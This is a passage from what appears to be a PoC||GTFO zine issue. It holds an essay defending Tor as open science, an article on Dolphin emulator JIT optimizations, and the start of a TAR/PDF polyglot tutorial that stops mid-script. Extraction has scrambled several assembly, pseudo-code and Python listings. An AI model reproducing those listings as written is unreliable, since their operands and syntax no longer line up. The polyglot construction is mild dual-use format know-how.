tics forces its way into places that used to manage to
keep it out—merit and skill no longer matter, dem-
agogues get to run the place, sooner than later its
original creators get thrown out, and then it collapses
into mediocrity and pent-up unhappiness. Imagine
that there would be no tool that would lay better to
our hand than to that of the aggressors, that we had
nowhere to retreat and nothing to fight them with
that they could not suborn. Why fight if there is no
chance to win, ever, anywhere?
Lucky for us, in every age there are things in the
world that resist hypocrisy and vagueness, things that
create the oases where we gather and hold.
We are doubly lucky because for us Mathemat-
ics has taken physical form. It has clothed itself in
silicon and electricity, and now we can wield it not
only among ourselves but also show it to others who
need not understand its language, but are content
to see its results. To see just how much luckier we
are, neighbors, than the geeks of Leonardo da Vinci’s
times, just read his resume that he sent to the ruler of
Milan. To support himself while exploring the nifti-
ness and awesomeness of nature and math, he had
few other options than promising to construct supe-
rior war machines. We are damn lucky, neighbors,
that we can build machines that deliver better pri-
vacy rather than better war if we so choose!
No sooner did I write this, neighbors, than real
life T M provided a case study, as if on cue. Tor is run
by evil scientists in the pay of the government! News
around the clock, on this website only! Ominous geek
conspiracy unmasked!
Tor, as you already know if you read its About
page, was originally funded as a US Navy research
project, and is still occasionally funded by some clue-
ful parts of the US government that care about people
getting news and other info that their governments
happen to not approve of. Given that this sermon
got to you neighbors by traveling for at least some
of its path along a series of tubes ordered by another
US military research agency, it is not surprising that
such clue still exists; let’s hope that it persists, neigh-
bors, as we sure could use more of it, the way things
are generally going in those quarters these days.
Thanks to this clue, and also to the selfless ded-
ication of Tor developers who made this project go
the way few government-funded projects ever do, we
have the Internet-scale equivalent of a Large Hadron
Collider for low-latency onion routing. Unlike the
LHC, this experiment is not just open to the pub-
lic, but also immediately useful. Which is where the
“revelations” come in: are “evil scientists” tricking the
public?
Luckily, Tor is science, and totally open science at
that—the best kind that hides nothing. It requires no
permission or special access to be attacked in the only
meaningful way that scientific claims are questioned
and their subject-matter is improved—by experiment.
Indeed, many good neighbors did so and helped im-
prove it—and you should read their papers, because
their work is nifty 1 . And when you hear someone
attack open science not with experiments or calcula-
tions but with FUD about money or attitude, either
1 Especially because it’s all open-access. Please enjoy the Freehaven Selected Papers in Anonymity.
http://www.freehaven.net/anonbib/
4that someone doesn’t understand how science works,
or has another angle.
There’s a bar analogy for everything in life (it’s
a more fun cousin of the car analogy), so here’s one
for how this hustle works. Imagine that someone is
loudly embarrassing himself and annoying neighbors
in a bar with a foolish story. Being good neighbors,
wouldn’t you be moved to step in (hey, it’s a bar and
a good deed!) and gently correct him? Except, you
discover that the bar has a hefty cover charge, and
the loud silliness is actually quite profitable.
That’s one bar it’s good to pass, neighbors, be-
cause it’s not in the business of enriching minds with
good stories while cheering hearts up with a hearty
drink. All it’s serving is the poisoned Kool-aid of
clickbait.
A clickbait purveyor 2 who happened to read the
About section of the Tor website must have thought
he struck a mother lode. An “evil scientist” story with
a garnish of government conspiracy—what a clickbait
oil well!
The “evil scientists” trope is a like perpetual mo-
tion machine for clickbait. Scientists aren’t the most
glib and suave communicators to begin with; they
tend to become annoyed when bullshit is heaped upon
them, letting their annoyance show. This in turn
is clear proof that they are evil and holding some-
thing back! Quick, attack them again, and spare no
personal detail, because there are hundreds of ways
that the geeks are geeky, and for each one there are
some folks that will be persuaded that geeks can’t be
trusted because of it.
The point of all this noisy commotion, neighbors,
is to make the public forget that science and technol-
ogy are in the business of making things that can be
judged on their own, regardless of their creators’ or
detractors’ motives, personalities, employers or lack
thereof, or in fact any other circumstances where
FUD, vagueness, and hypocrisy may be brought to
bear. A scientific artifact stands on its own, the same
way a formula is either correct or meaningless, regard-
less of whose hand wrote it. Trying to guess what di-
rected that hand is worse than pointless if the point
is to know if we should put our trust in the artifact—
because good motives don’t make good science, and
suspecting the scientist of a conspiracy adds precisely
zero bits of information, and clouds thinking.
Over what criteria should one evaluate Tor, then?
As one should any other engineered artifact: whether
it does what it says on the label, whether it does
anything not specified on the label, and whether the
operating conditions under which it can successfully
function are present. Are the operators of the nodes
that make up your Tor circuit actually independent
and uncompromised, or are Sibyl attacks an impor-
tant concern—and from whom? Is there enough mu-
tual information between packets entering and exiting
Tor to deanonymize users—and from what perspec-
tive on the network is that information available?
In clickbait, you will not find these questions
asked, much less their answers. Not sure whether an
article’s clickbait or not? Try suggesting to those re-
sponsible for it what questions they could have asked.
If the answer is a wave of harassment rather than
a follow-up, congratulations, you’ve found clickbait.
Worse, you are in the land of hypocrisy and vague-
ness; get out fast.
Once we remember that, neighbors, the FUD
clouds of zero-information verbiage dissipate, and the
saving light shines through. Technology is not magic
that must be judged only by the kind of witches and
wizards who create it, tainted by evil or doom un-
beknownst to mere mortals. It is knowable and dis-
sectible, and our predecessors left us the greatest gift
of understanding that, and of approaching it just so.
If we got any further out from under the shadow of
vagueness and hypocrisy, it was thanks to that legacy
and to that principle. And so we will walk out of this
Valley of clickbait and bullshit, and we shall not fear,
because they will hold no power over us. And for this
we are thankful.
2 Astronomy and astrology are not in the same business even though they both have to do with stars; so with journalism
and clickbait generation. Be kind to good journalists, neighbors! They are few and far between, and their battles with bullshit
tend to be a lot more uphill than ours.
53
Gekko the Dolphin
by Fiora
3.1
The Porpoise of Dolphin
Dolphin is one of the most popular emulators, supporting games and other
applications for the GameCube and Wii game consoles. Featuring a highly
optimized just-in-time (JIT) compiler and graphics unit that translates GPU
opcodes into vertices, textures, and shaders, Dolphin is able to emulate almost
all GameCube and Wii games at high speeds on a modern x86 CPU.
Instead of trying to do a detailed anatomy of the entire system, much of
which is beyond my current understanding, in this PoCkGTFO article I’m going
to focus on some particularly evil assembly optimizations and interesting bug
fixes in the Dolphin JIT from the past two months—some large and dramatic,
others small and elegant (or horrifically hacky, depending on your perspective!)
But first, let’s do a quick overview of how Dolphin works and some of the
biggest difficulties inherent in Gamecube/Wii emulation.
Dolphin’s JIT is superficially similar to a typical PowerPC emulator, but
things are not nearly so simple as they appear. The GameCube Gekko CPU
(and the extremely similar Broadway CPU on the Wii) has a number of par-
ticularly odd features that aren’t present on a typical PowerPC.
• A “paired singles” SIMD unit, somewhat similar to 3DNow! but com-
plicated by some of PowerPC’s inherent weirdnesses with floating-point
(32 bit floats are represented as 64 bit internally, similar to x87).
• Built-in “graphics quantization” registers, which allow quantized loads
and stores based on runtime-variable parameters, up to and including the
data type to be converted to and from.
• A complex memory layout with mirrored regions and a slew of MMIO fea-
tures, including a memory-mapped FIFO usually connected to the GPU,
but which can also be repurposed for other uses by games.
• The ability to directly access—and modify—the active GPU frame buffer.
• Complex cache manipulation features, such as the ability to enable a
“locked cache” and access memory as cached or uncached.
• A floating point unit with its own very unique definition of the word
“multiply.”
Making emulation even more difficult, games tend to abuse every aspect of
the system imaginable, from the precise rounding of every floating point in-
struction to self-modifying code to behavior that isn’t even defined in IBM’s
specification for the CPU. Additionally, games typically run in supervisor mode,
giving them the ability to abuse a wide variety of features user-mode applica-
tions can’t. All of this leads to severe limits on the shortcuts Dolphin can take;
the most benign-seeming optimization often results in a slew of unintended
consequences. Dolphin can’t even reorder memory loads; an attempt to do
this resulted in a real game failing because of exception handling semantics not
being maintained. 3
3 Dolphin-Emu
issue 5864
6AAAAAA
BBB
CCCCCC
DDD
6
3
6
3
bit
bit
bit
bit
00AA AAAA 0000 0BBB 00CC CCCC 0000 0DDD
code representing the quantization factor (2 −32 to 2 31 ) for loads.
code representing the data type for loads (float, S8, U8, S16, or U16).
code representing the quantization factor (2 −32 to 2 31 ) for stores.
code representing the data type for stores (float, S8, U8, S16, or U16).
Figure 1: GQR Register Format
Yes, there are applications that require precise emulation of MMU mechanics, including post-exception
rollback. Yes, there are applications that intentionally try to execute an address of 0x00000001 to trigger a
custom exception handler, and won’t run unless this behavior is properly emulated. Yes, there are applica-
tions that modify code without properly flushing the CPU instruction cache and rely on the mere hope that
the old code will have been since replaced in the cache. And yes, there are applications that may do many
of these things with the intent of sabotaging Dolphin emulation.
Yet we still have to emulate a 729 MHz PowerPC CPU on a 2-3 GHz x86 CPU, all while trying to run
programs that may very well be trying to prevent us from doing so.
3.2
Reserved bits are really just shy
A number of games were breaking in mysterious fashion with the JIT implementation of “paired singles”
quantized loads and stores. Some crashed, while others had wildly broken lighting effects or other strange
artifacts. Yet, even upon very close inspection, the JIT implementation was nearly identical to the (order-
of-magnitude slower) interpreter implementation, which worked correctly. What could games possibly be
doing here to break the JIT?
To understand this bug, it is crucial to understand the precise layout of the Gekko CPU’s eight graphics
quantization registers (GQRs). Each quantized load and each quantized store references one of these eight
registers to act as its parameters. Figure 1 describes the format of the GQR registers.
The manual describes the other bits as being zero, but unfortunately, that isn’t quite true. They were
assumed to be zero, but the CPU never enforced this. Games could–and half a dozen games did–smuggle
flag bits through these reserved register bits. Whether this was a bug, or perhaps done for some attempt at
anti-emulation code, or even a strange sort of thread-local storage, we may never know.
The JIT’s flawed assumption caused the implementation to either read out of bounds in the quantization
array or even outright jump to an invalid function pointer. Fortunately, masking out those bits was just a
single and operation; the main cost of this glitch was days of debugging by puzzled developers.
Since resolving this issue, I’ve written hardware tests to test reserved bits in other system registers too,
which revealed all sorts of strange behavior. For example, the XER (fixed-point exception register), is laid
out as follows.
1 [ SO ] [ OV ] [ CA] 0 0000 0000 0000 0000 0000 0AAA AAAA
SO is the summary overflow flag, OV is the overflow flag, and CA is the carry flag, with AAAAAAA being
a 7 bit control code for string load/store instructions.
But on the Gekko, the actual bits that the CPU allowed to be set in XER were 0xE000FF7F; it apparently
supported setting the 8 bits in XER[16-23] even though it doesn’t support the associated instruction, the
string compare instruction lscbx (load string and compared byte indexed, similar to rep cmpsb on x86). I
sincerely doubt any games used those bits in XER, but one can never be quite certain of such a thing.
73.3
Practice your multiplication,
or you might become a GameCube CPU when you grow up!
For as long as it’s existed, Dolphin has had trouble with replays, like those in racing games (Mario Kart,
F-Zero) and fighting games (Super Smash Brothers). Emulation often desynced dramatically within seconds
of the start of a console-recorded replay, with cars flying off the racetrack or Mario tripping off the side of
the stage. The same happened in reverse, when emulator-recorded replays were transferred to a physical
console. This was particularly dramatic in the case of Mario Kart’s ghost feature, in which the game let you
play against “ghosts” recorded by the developers of the game. The ghosts would very quickly drive into a
wall, making victory quite trivial, if not very satisfying.
The source of this strange yet consistent desyncing was the way these games recorded replays. Instead of
recording the movement of the karts or characters, the games record the player’s input. This is a much more
compact representation, but unfortunately, it means the most minuscule error on playback can accumulate
until the result desyncs completely. To make replays, ghosts, and other similar features function correctly,
Dolphin’s floating point unit would have to match the Gekko’s to the last bit of rounding.
For many months the Dolphin developer Magumagu exhaustively attempted to reverse-engineer the
hardware FPU and make a software implementation. One by one, precise versions of instructions were
implemented. Among the first victims were frsqrte, approximate inverse square root, and fres, the ap-
proximate reciprocal, which were replaced with table-driven versions matching the actual Gekko hardware.
But it still wasn’t enough; replays still constantly desynced, and bizarrely, the trouble seemed to trace back
to the multiply instruction.
Some consoles do use non-IEEE floating point, like the Playstation 2; the curiosities of emulating this
could make for an article of its own. Yet the Gekko was supposedly equipped with an IEEE-compatible
floating point unit, denormals and all! How could multiplies on a GameCube give different results than on
a typical desktop PC even with identical rounding flags set?
The problem, as Magumagu discovered, traced back to exactly how the floating point unit’s internals
were implemented. A double-precision float has 53 bits of mantissa; combined with three guard bits, this
makes a 56 bit input. Accordingly, the Gekko had a 56x28 bit multiply and performed double-precision
multiplies by combining the results of two 56x28 bit multiplies. Single precision multiplies were done with
just one execution of the multiply unit.
But on the Gekko, all floating-point numbers are stored as 64 bit doubles. Single precision operations
have reduced output precision and clamp their output to 32 bit precision, but are still stored as 64 bit
doubles. Technically, according to the manual, you’re not supposed to perform single-precision operations
on double-precision values; the result is supposedly undefined. But, of course, countless games did it all over
the place, so we still have to emulate it in a way that matches the behavior of the hardware.
Most single-precision operations seemed to be fine with double-precision input; a single-precision floating-
point add, for example, seemed to be identical to performing a double-precision add and then rounding to
single-precision. But, as Magumagu discovered, multiplies were their own unique brand of bizarre: they
rounded the right hand side operand’s mantissa to 25 bits of precision (for 28 including guard bits), then
performed a 56x28 bit multiply. Note that 25 bits gives neither single nor double precision; it’s something
in between.
Fortunately, it took just four SSE instructions to perform this rounding operation for each multiply:
1 movapd
pand
3 pand
paddq
xmm1,
xmm0,
xmm1,
xmm0,
xmm0
[ t r u n c a t e _ m a n t i s s a ] ; 0xFFFFFFFFF8000000
[ round_bit ]
; 0 x0000000008000000
xmm1
The overall performance loss was barely measurable compared to the literally dozens of games with fixed
replays or physics, ranging from Zelda: The Wind Waker to Donkey Kong Country.
As Dolphin’s primary tester, Justin Chadwick, once said, “Fiora, I hate how in your build the AI no
longer bounces off the track in Mario Kart Wii. It makes it a lot harder to win.”
83.4
Dolphin intentionally makes thousands of segfaults
Emulating one CPU’s virtual memory subsystem on another CPU is hard. Doing so quickly is even harder.
A direct approach would be to map one host page to each emulated page, but that’s impossible on Windows
because the Alpha AXP CPU didn’t have a “load 32 bit integer” instruction. I’m not making this up. 4 The
existence of MMIO, VRAM being directly mapped into CPU memory, and mirrored sections of the memory
map certainly don’t help.
The simplest approach would be to send every load and store through software address translation, but
this proves to be fantastically slow. (Remember, we can only spend about three or four x86 cycles per
Gekko CPU cycle!) Dolphin does support a variant of this as “full MMU emulation mode,” which a few
games with particular complex memory layouts do require. But for most games, it gets away with a vastly
more elegant—or horrific—solution. Which one applies to you depends on how you feel about intentionally
triggering thousands of segfaults.
For every memory access, Dolphin first tries to perform address constant propagation—if we know which
area of memory an address is in, we can directly pass off the load or store to wherever it’s supposed to go;
usually a direct RAM access or a push to the FIFO. For the rest of the memory accesses, it shouts “YOLO”
and just goes for it, with seemingly no care for what might happen if the access isn’t to valid RAM.
But Dolphin has an ace up its sleeve: it’s replicated the rough address space layout of the Gekko CPU
in virtual memory using the operating system’s shared memory features. Yes, that’s a four gigabyte chunk
of contiguous address space, including mirrored sections. (Addresses 0x8010000 and 0x0010000 map to
the same place due to mirroring.) Sections that aren’t directly mapped to physical RAM are marked as
inaccessible.
When the “YOLO” access fails, a segfault is thrown by the operating system and caught by Dolphin’s
handler, which proceeds to backpatch the x86 code that caused the segfault to jump to a trampoline which
then redirects to the slow, safe memory access handler. Thus, only the few memory accesses that actually
go to non-RAM addresses take the slow route, while the rest are simply a mov and bswap.
This feature, called “fastmem,” isn’t at all new to Dolphin, but is nevertheless among a core reservoir of
hacks that keep Dolphin’s JIT fast. Tests suggest it provides at least a 15-20% CPU performance benefit
over runtime address range checking.
3.5
Wasting all your cache is a good way to go bankrupt
As mentioned in the previous section, a few games make sufficient use of the GameCube’s fancy MMU
features that they need to take the slow path—full MMU emulation. While address translation (which is
hopelessly unoptimized in Dolphin) is a significant cost, the greatest speed cost actually comes from the
other consequences of full MMU mode. One of these is that it must check exceptions manually after every
single memory operation, and if so, flush the register state, revert any address update that occurred in the
load, and jump to the handler. It’s all rather painful and an optimizer’s worst nightmare, as it generates
massive code bloat and places great constraints on instruction reordering and other aspects of optimization.
Because of all this, full MMU games tend to require incredible amounts of CPU power to emulate. While
a few are at least playable on a very fast PC, others aren’t so lucky. Rogue Squadron 2, for example, was
developed by Factor 5, a game developer notorious for their ability to squeeze performance never thought
possible out of consoles. In the Nintendo 64 era, they rewrote the GPU firmware to render five times more
polygons than it was ever meant to. In Rogue Squadron 2, their incredible stressing of the Gamecube has
led to a game that runs at half-speed in Dolphin on a 4 Ghz Intel Haswell CPU.
In addition, likely due to Dolphin’s incomplete MMU implementation, a number of full MMU games
simply don’t boot at all: Rogue Squadron 3, Toy Story 3, and Disney Infinity among them. Particularly in
the case of the latter, this might very well be anti-emulation code.
Profiling Rogue Squadron 2 with VTune suggested L1 instruction cache misses occurred at a rather high
rate. The cost of cache misses is hardly a new topic in the optimization world, but code cache misses tend to
be glossed over. Modern x86 CPUs have vast instruction fetch bandwidth, long pipelines to absorb fetch miss
4 unzip
pocorgtfo06.pdf 64k.txt
9bubbles, and while performance can certainly be improved by reducing code size, it’s often not considered a
major factor.
Regardless of this, I figured I would see how much could be gained. I created a “far code buffer” in which
to stuff all the rarely-used generated code (like exception handling and recovery for each memory access)
instead of having it inline. Maybe this would get us a few percent of a speed increase?
With one rather simple commit, Rogue Squadron 2 sped up over 30% on my Ivy Bridge. The bloating of
the generated code had cost so much that the CPU spent roughly 40% of its time sitting idle, waiting for new
instructions to come in. The gain was even larger—over 50%—on another developer’s Haswell, most likely
because the Haswell has even higher instructions per clock-cycle count, and is thus even more susceptible to
being front-end bound. Even in POV-Ray, a heavily floating-point-bound benchmark that doesn’t use the
MMU and was hardly known for its binary size, the gain was roughly 6% overall.
Never underestimate the value of instruction cache on modern CPUs. With a Haswell’s four ALUs, two
load units, and one store unit, it might very well be able to chew through instructions much, much faster
than you can feed it.
3.6
It’s normally abnormal for denormals to renormalize
I mentioned previously how the Gekko CPU internally stores all its floats—even 32 bit ones—as 64 bit doubles.
This means that Dolphin has to convert floats to 64 bit on load, and convert back to 32 bit on store, at least
if the lfs (load float single) and stfs (store float single) instructions are used. Hypothetically, if a value
was loaded immediately and then stored, an optimizing recompiler could remove the conversion, but this
can only sometimes be proven safely.
This wouldn’t be an issue normally, outside of the small speed cost of a single extra conversion operation
on each load and store. But unfortunately, yet again, games are not so kind. A strangely large number of
games use lfs and stfs to copy integer data, which means the conversion process of float-to-double-to-float
must be lossless, regardless of input. This would normally work, but at the same time, a large number
of games also set the flush-to-zero (FTZ) floating point flag, which causes denormal floating point results
to be set to zero by the CPU. Unfortunately, this also applies to our float-to-double and double-to-float
conversions, so any game copying integer data that happens to look like a denormal float will have its data
corrupted.
We can’t turn off FTZ, because that would result in floating point arithmetic errors of the same sort
that motivated the multiplication rounding changes mentioned previously. We also can’t toggle FTZ off
then back on again; the floating point control registers on x86 take upwards of fifty cycles to modify. The
initial solution was to set rounding flags for SSE2, then do the load/store conversions using x87 (which,
conveniently, doesn’t even support FTZ). The one tricky part was fixing up the NaN flags afterward, as x87
handles NaN differently from SSE2, setting an exception flag instead. This is what the double-to-float code
looked like.
movsd [ temp64 ] , xmm0
2 movsd
xmm1, xmm0
fld
[ temp64 ]
4 ptest
xmm1, [ double_exponent ] ; 0 x7FF0000000000000
fstp
[ temp32 ]
6 movss
xmm0, [ temp32 ]
jnc .d on t_ re set _q na n_ bit
8 pandn
xmm1, [ double_qnan_bit ] ; 0 x0008000000000000
psrlq
xmm1, 29
10 vpandn
xmm0, xmm1, xmm0
.d on t_ re set _q na n_ bit :
This is better than fifty cycles per load and store, but it’s still inefficient and gross enough to make x86
assembly writers everywhere squirm in discomfort. The overall speed penalty was around 20% on Super
10Smash Brothers Melee—but there was little choice, since the alternative was inaccurate emulation that broke
many games.
Fortunately, there is one other way. What if we just checked for denormals, passed them off to a slow,
rarely-taken code path, and sent everything else through SSE? This has the bonus effect of not needing to
fix up the NaN bit, since only denormals (not NaNs) would take the x87 path. The resulting code looks like
the following.
1 movq
rax , xmm0
shr
rax , 55
3 sub
al , 0x6D
cmp
al , 3
5 jbe . x 8 7 c o n v e r s i o n
cvtsd2ss xmm0, xmm0
7 jmp . c o n t i n u e
movsd [ temp64 ] , xmm0
9 f l d [ temp64 ]
f s t p [ temp32 ]
11 movss xmm0, [ temp64 ]
.continue :
The comparison at the top is a bit tricky and designed to minimize code size, since this code will be
duplicated countless times throughout generated JIT code. The only actual exponents that need to take
the slow path are those in the range [0x369, 0x380], but sending a few more to minimize the size of the
comparison has negligible effect on performance (in this case, [0x368, 0x387]). The comparison could be
simpler if zeroes are also sent to the slow path, but testing shows that there’s a very large proportion of
zeroes—as many as a third of the inputs. With the check shown here, only 0.01% of floats take the slow path
and the overall performance penalty for this change drops from 20% to 2%.
As a side note, the official IBM manual claims that the Gekko/Broadway CPU uses denormals-are-zero
(DAZ) in addition to FTZ when the non-IEEE (NI) flag is set. Curiously, actual hardware testing shows
that the CPU doesn’t ever seem to actually do this.
3.7
Hey I just RET you, and this is crazy,
but here’s my address, so CALL me maybe?
Modern x86 CPUs typically have a built-in return stack, designed to predict where a ret instruction is
heading, with the assumption that every call is paired with exactly one ret. This is a pretty good assumption,
and in the rare cases where it fails, the performance cost is typically equivalent to a branch misprediction.
Without this prediction, a return would be relatively costly and difficult to predict—little different from an
indirect branch jmp [rsp] or similar.
 (branch with link) and blr (branch to link
PowerPC has its own similar call and return instructions: bl
register). The first jumps to a location and stores the old location in the link register (the return address),
while the latter jumps to the location stored in the link register. When emulating blr, Dolphin treats it
as an indirect jump to the link register. This is the natural translation for such an instruction, but it is
costly from a branch misprediction standpoint, since such a branch is extremely difficult to predict correctly.
Profiling shows a non-trivial number of micro-ops lost to branch mispredictions.
Comex’s idea was to re-use the CPU’s existing return prediction stack. On a bl instruction, instead of
jumping to the target function, he would push the emulated destination address onto the stack and then
call the target JIT’d function. When emulating a blr instruction, instead of jumping to the given link
register, he compares the link register against the one stored on the stack at [rsp+8], and if the two match,
returns with ret. If functions call and return as expected, this approach should give near-perfect branch
prediction. Despite the seeming increase in instruction count, this led to roughly an eight percent overall
speed increase across nearly every game merely from improved return prediction.
The one danger of this is the possibility of the stack overflowing. If a game uses bl without an associated
blr, the return stack will continually grow until Dolphin crashes. Comex’s first solution was to clear the
11stack whenever a misprediction occurred; this reduces the problem to the pure evil case of an application
that used bl hundreds of thousands of times in a row without any blr. Out of curiosity and being a bit
pedantic about correctness, he decided to support this case as well, writing a short test case that triggered
the problem and setting up guard pages and extending the signal handler to catch any failure.
The core concept of this optimization is not too different from fastmem. Hijack a hardware CPU feature
(in that case, memory protection, in this case, return address prediction) and use it to help emulate the
same feature of the target CPU, even if it wasn’t really intended for that purpose.
3.8
Through the SUBFIC and the SRAW we carry on
Like x86, PowerPC has a number of instructions that set flags based on their result. Unlike x86, there are
two ways in which this can happen. There’s condition flags (GT, LT, EQ, SO) which can be set by a comparison
operation or an arithmetic instruction with the Rc bit set. This is a lot more convenient than x86, because
one can generally avoid clobbering the flags when they’re not needed, which makes code more efficient and,
coincidentally, emulation easier.
Carry flags, on the other hand, are not quite so friendly. Some common instructions set carry uncon-
ditionally (subfic, sraw, srawi), enough so that carry calculation becomes a significant cost even in code
that doesn’t make heavy use of carry bits. The calculation of carry bits for sraw and srawi in particular is
a bit non-trivial, easily requiring a half-dozen or so extra instructions on x86 to emulate.
The first step to optimizing carries was to enhance PPCAnalyst, the class that performs dependency
analysis on instructions. If an instruction calculates a carry bit, but that bit is overwritten before being used
or before reaching a JIT block exit, we can omit the calculation of that carry bit entirely.
PPCAnalyst also has an instruction reordering pass that uses dependency information to reorder instruc-
tions wherever it can be sure doing so is safe. This was originally just used to move comparison instructions
next to branches so the two can be merged, but it can be extended to support a wide variety of operations.
I modified the instruction reordering pass to attempt to “stick” pairs of carry-using instructions next
to each other. A large number of common PPC idioms use sequences such as subc+subfe; not merely
arithmetic on variables larger than the register size. One example is r0 = (r1 != r2).
subf r3 , r1 , r2
2 addic r0 , r3 , −1
subfe r0 , r0 , r3
The PowerPC Compiler Writer’s Guide lists a number of these in the appendix. 5
The third and final step was to take advantage of this; if the next instruction is going to consume the
carry bit, take advantage of the x86 carry flag instead of storing the carry bit in the emulated CPU state.
This is a slightly tricky (and limited) optimization, since it requires the instructions to follow each other
directly, since most instructions will clobber the x86 flags.
Combined with the “sticky” reordering, these changes were able to drastically reduce instruction count
in carry-heavy code; some recompiled sequences dropped in size by a factor of two or more. Some games,
such as Virtual Console games (an emulator inside an emulator!) went as much as 12% faster just with these
carry optimizations.
An interesting future optimization might be to recognize some of the aforementioned multi-instruction
compiler idioms and transform them into equivalent idiomatic x86 code; this could be even better than
merely optimizing the individual instructions!
3.9
Capturing performance from the flags
As mentioned in the previous section, many integer operations, such as comparisons and operations with
the Rc (record) bit set, have the ability to set result flags in the PowerPC condition register. The condition
5 https://www-01.ibm.com/chips/techlib/techlib.nsf/techdocs/852569B20050FF7785256996007558C6
12register is split into eight 4 bit sections, each of which represents one result, consisting of the LT, GT, EQ, and
SO flags. This is in sharp contrast to x86, for which most instructions set flags unconditionally. It only has
a single condition flags register instead of eight.
Emulating operations on these flags efficiently is critical to performance in Dolphin. It’s often difficult
to prove that an update to the flags register won’t be used again following its most immediate use (e.g. a
conditional branch), so the relevant calculations can’t be omitted.
Delroth and Calc84maniac discovered a brilliant way to optimize Dolphin’s internal flag representation
to minimize the work required to set and read flag bits. These two operations represent the vast majority
of operations on flags; everything else, such as boolean operations between flag bits and reading out the
flags register, is practically a rounding error by comparison. In addition, reading out flag bits is done almost
entirely by conditional branch operations.
The flag representation they invented involves the flags being stored as a 64 bit integer. Bit 63 is equal
to !GT, bit 62 equal to LT, bit 61 equal to SO (a flag not fully emulated by Dolphin, but also rarely used
except as the output of a boolean flag operation), bit 32 always set, and bits 0-31 set to zero if EQ.
This representation has the useful property that it can be calculated using a single instruction from the
result of any integer operation; a 32− >64 bit sign extend (movsxd on x86_64). Individual flags can also be
read out with single operations:
1 GT
LT
3 EQ
SO
=
=
=
=
( s 6 4 )CR
CR & ( 1
( s 3 2 )CR
CR & ( 1
> 0
<< 6 2 )
== 0
<< 6 1 )
While this dramatically complicated operations such as loading the flags register, the overall performance
effect was tremendous. Performance improvements in typical games ranged from six to fourteen percent
merely from being able to omit most of the instructions (and code bloat) involved in flag calculation. This
change also inspired later optimizations, like splitting carry bits into their own emulated register instead of
storing them in XER. There’s no requirement that an emulator maintain the same data representations the
ISA describes, so long as it transparently performs whatever conversions are necessary for correct emulation.
3.10
With Dolphin, Wii have a bright future
Dolphin still has a long way to go. The graphics engine is imperfect and still missing a few rather difficult
features, like zfreeze and OpenGL line-width support. Dual-core mode is still sometimes a bit finicky with
timing-sensitive games. GPU to CPU data transfer can be a speed issue, as well as vertex loading for
geometry-heavy games. There are still many driver issues, like the long compilation times for shaders, that
cause unwanted stutter and slowness.
The HLE audio engine is good but not perfect, with some games still requiring low-level emulation to
avoid glitches. Countless minor bugs, from subtle depth buffer issues to issues with non-normal floating
point numbers and console glitches not being reproducible in Dolphin, still exist. On the CPU side, even
with many optimizations, some games are still slow, and a few still don’t even boot properly.
But improvements like these are a start. Already, many games that were far too slow to be playable on
all but the fastest overclocked Haswell CPUs are accessible to a much wider audience. And while Dolphin is
not and probably never will be a perfectly cycle-accurate emulator (in fact, because of DVD read times and
NAND write times, no two physical consoles will even produce identical results!), it may now be accurate
enough to create at least some console-verifiable replays and speed runs.
Figure 2 gives some examples of the performance improvements, measured on a variety of synthetic
benchmarks and games known for being performance-intensive, between revision 2301 (late July of 2014)
and revision 3378 (late September of 2014), as measured on my Ivy Bridge CPU.
Dolphin is hardly a new project; it was open-sourced six years ago and developed as a closed-source
project for many years before that. It’s far too easy to assume that relatively stable, mature projects don’t
13POV-Ray
LUA “binary trees” benchmark
Sonic Colors
Rogue Leader
F-Zero GX
The Last Story
Xenoblade Chronicles
62%
48%
39%
103%
110%
38%
40%
faster
faster
faster
faster
faster
faster
faster
Figure 2: Dolphin Performance Improvements
have much room for improvement; as new contributors, we have to resist the urge to shy away from projects
like this, because often there are still vast gains to be had.
Thank you so much to Comex and Delroth for their part in these two months of incredible CPU emulation
performance improvements. Thanks also to Justin Chadwick (JMC4789) for his unmatched testing and bug
bisection skills across hundreds of games, as well as the monthly Dolphin progress report writeups. And
thanks to all the other devs: Ryan Houdek, Skidau, Lioncash, Shuffle2, Magumagu, Calc84maniac, Rachel
Bryk and many others, for their tireless work on the other aspects of Dolphin, bug fixes, and assistance with
the endless ignorant questions I asked on the way to learning the inner workings of Dolphin’s CPU emulation
engine.
Dolphin has been the most approachable project of any I’ve yet tried to contribute to, from the helpful
developers to the relatively clean codebase. I somehow managed to become the go-to woman for the JIT in
a mere six or so weeks, despite having never conceived before that I could ever contribute meaningfully to
an open source project.
For anyone looking to contribute, there’s an abundant supply of interesting (or terrifying, depending
on your perspective) emulation bugs just itching for someone to attack with the single-step debugger and
printf hammer. Plus, with the brand new 64 bit ARM JIT, there are countless instructions that still
need implementations—and there are certainly lots of missing optimizations for the x86 JIT too. Drop by
#dolphin-dev on Freenode or drop us a pull request—any help is always appreciated!
144
This TAR archive is a PDF!
(as well as a ZIP, but you are probably used to it by now)
by Ange Albertini
In this article we’ll build a TAR/PDF polyglot file with a few simple tools that you already have if you
write in TeX or LaTeX (if not, take a couple of days to learn—wouldn’t it be just spiffy to submit your very
own PoCkGTFO piece in ready-to-go LaTeX?).
4.1
What is a TAR file?
TAR, written in the days when tape drives were the only serious form of backup, stands for TApe aRchive.
Not surprisingly, its design is tightly coupled with the mechanics of tape drives. Those drives were made by
IBM and were invented for the IBM 650, which was produced in 1953.
Accordingly, in those archives files are stored without compression, lengths and checksums are stored in
octal, and everything is 512-byte block based. Respect old age, neighbors—and remember that your own
modern technology might not survive that long.
4.2
Abusing the format
A TAR file starts with a fixed-length record of one hundred bytes, where the archived file’s original name is
stored, padded with zeros. 6 We can abuse this record to store a PDF header and a dummy stream object
to cover the rest of the archive.
We’ll let pdflatex build the dummy stream object for us from a .TeX source. We just need to declare
this object (with no compression) right after the \begin{document}:
\begingroup
\ p d f c o m p r e s s l e v e l =0\relax
\immediate\ p d f o b j stream
4
f i l e { archive . tar }
\endgroup
2
We then need to move the stream content so that it virtually starts at offset 0, fix the file name, and
insert a valid %PDF-1.5 signature.
After the initial hundred byte record, a TAR file contains a header checksum. We need to fix it, be-
cause unlike many other checksums, it is actually enforced. The fixing isn’t too difficult, but the format is
nevertheless rather awkward. Here is the procedure, with a python script to perform it.
1. Overwrite the checksum (at offset 0x94, 8 bytes long) with spaces.
2. Add all the unsigned bytes of the header.
3. Write this value as octal, with leading zeroes.
4. End the checksum with a NULL character at the 6-byte offset into the field.
1 OFFSET = 0 x94
# Wipe t h e checksum f i e l d w i t h s p a c e s .
3 f o r i in r a n g e ( 8 ) :
h e a d e r [ i + OFFSET ] = " "
5
# Sum a l l b y t e s o f t h e h e a d e r t o an u n s i g n e d i n t .
